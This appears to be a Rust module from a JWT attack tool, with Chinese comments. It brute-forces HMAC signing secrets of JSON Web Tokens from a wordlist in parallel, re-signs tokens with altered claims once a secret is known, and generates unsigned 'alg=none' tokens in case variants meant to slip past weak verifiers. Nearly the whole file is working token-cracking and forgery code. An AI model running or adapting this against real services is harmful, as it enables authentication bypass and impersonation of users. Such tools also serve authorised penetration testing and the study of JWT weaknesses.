use crate::models::*;
use crate::dictionary::DictionaryGenerator;
use crate::analyzer::parse_jwt;
use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use hmac::{Hmac, Mac};
use sha2::{Sha256, Sha384, Sha512};
use sha1::Sha1;
use std::time::Instant;
use rayon::prelude::*;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

type HmacSha256 = Hmac<Sha256>;
type HmacSha384 = Hmac<Sha384>;
type HmacSha512 = Hmac<Sha512>;
type HmacSha1 = Hmac<Sha1>;

fn b64url_encode(data: &[u8]) -> String {
    general_purpose::STANDARD
        .encode(data)
        .replace('+', "-")
        .replace('/', "_")
        .trim_end_matches('=')
        .to_string()
}

/// 用给定 secret 对 signing_input 做 HMAC 签名并返回 base64url
fn sign(alg: &str, signing_input: &str, secret: &str) -> Option<String> {
    let key = secret.as_bytes();
    let data = signing_input.as_bytes();
    match alg.to_uppercase().as_str() {
        "HS256" => {
            let mut mac = HmacSha256::new_from_slice(key).ok()?;
            mac.update(data);
            Some(b64url_encode(&mac.finalize().into_bytes()))
        }
        "HS384" => {
            let mut mac = HmacSha384::new_from_slice(key).ok()?;
            mac.update(data);
            Some(b64url_encode(&mac.finalize().into_bytes()))
        }
        "HS512" => {
            let mut mac = HmacSha512::new_from_slice(key).ok()?;
            mac.update(data);
            Some(b64url_encode(&mac.finalize().into_bytes()))
        }
        "HS1" => {
            let mut mac = HmacSha1::new_from_slice(key).ok()?;
            mac.update(data);
            Some(b64url_encode(&mac.finalize().into_bytes()))
        }
        _ => None,
    }
}

/// 验证 secret 是否匹配给定 JWT
pub fn verify_secret(token: &str, secret: &str) -> bool {
    let parsed = match parse_jwt(token) {
        Ok(p) => p,
        Err(_) => return false,
    };
    let signing_input = format!("{}.{}", parsed.raw.header_b64, parsed.raw.payload_b64);
    match sign(&parsed.header.alg, &signing_input, secret) {
        Some(computed_sig) => computed_sig == parsed.raw.signature_b64,
        None => false,
    }
}

/// 主爆破函数：并行字典爆破
pub fn bruteforce(
    token: &str,
    wordlist: Option<Vec<String>>,
    use_builtin: bool,
) -> Result<BruteResult> {
    let parsed = parse_jwt(token)?;
    let alg = parsed.header.alg.to_uppercase();

    if !alg.starts_with("HS") {
        return Ok(BruteResult {
            success: false,
            found_secret: None,
            attempts: 0,
            duration_ms: 0,
        });
    }

    // 构建字典
    let mut candidates: Vec<String> = Vec::new();
    if use_builtin {
        candidates.extend(DictionaryGenerator::builtin_secrets());
    }
    if let Some(wl) = wordlist {
        let expanded = DictionaryGenerator::expand_wordlist(&wl);
        candidates.extend(wl);
        candidates.extend(expanded);
    }
    candidates.dedup();

    let signing_input = format!("{}.{}", parsed.raw.header_b64, parsed.raw.payload_b64);
    let expected_sig = parsed.raw.signature_b64.clone();
    let alg_ref = alg.clone();

    let counter = Arc::new(AtomicU64::new(0));
    let start = Instant::now();

    let result = candidates.par_iter().find_any(|secret| {
        counter.fetch_add(1, Ordering::Relaxed);
        match sign(&alg_ref, &signing_input, secret) {
            Some(sig) => sig == expected_sig,
            None => false,
        }
    });

    let duration_ms = start.elapsed().as_millis() as u64;
    let attempts = counter.load(Ordering::Relaxed);

    Ok(BruteResult {
        success: result.is_some(),
        found_secret: result.cloned(),
        attempts,
        duration_ms,
    })
}

/// 用已知secret重新签名（伪造token）
pub fn forge_token(
    original_token: &str,
    new_claims: &serde_json::Value,
    secret: &str,
    override_alg: Option<&str>,
) -> Result<String> {
    let parsed = parse_jwt(original_token)?;

    let alg = override_alg.unwrap_or(&parsed.header.alg).to_string();

    // 重新构建header
    let mut header_map = serde_json::json!({
        "alg": alg,
        "typ": "JWT"
    });
    if let Some(kid) = &parsed.header.kid {
        header_map["kid"] = serde_json::Value::String(kid.clone());
    }

    let header_b64 = b64url_encode(serde_json::to_string(&header_map)?.as_bytes());
    let payload_b64 = b64url_encode(serde_json::to_string(new_claims)?.as_bytes());
    let signing_input = format!("{}.{}", header_b64, payload_b64);

    let signature = sign(&alg, &signing_input, secret)
        .ok_or_else(|| anyhow::anyhow!("不支持的签名算法: {}", alg))?;

    Ok(format!("{}.{}.{}", header_b64, payload_b64, signature))
}

/// 生成alg=none的无签名token
pub fn forge_none_token(original_token: &str, new_claims: &serde_json::Value) -> Result<String> {
    let _parsed = parse_jwt(original_token)?;

    let variants = ["none", "None", "NONE", "nOnE"];
    let mut result = Vec::new();

    for variant in variants {
        let header = serde_json::json!({"alg": variant, "typ": "JWT"});
        let header_b64 = b64url_encode(serde_json::to_string(&header)?.as_bytes());
        let payload_b64 = b64url_encode(serde_json::to_string(new_claims)?.as_bytes());
        // none算法：signature为空
        result.push(format!("{}.{}.", header_b64, payload_b64));
    }

    // 返回第一个（最标准的）；调用者可自行测试所有变体
    Ok(result.join("\n--- 变体 ---\n"))
}
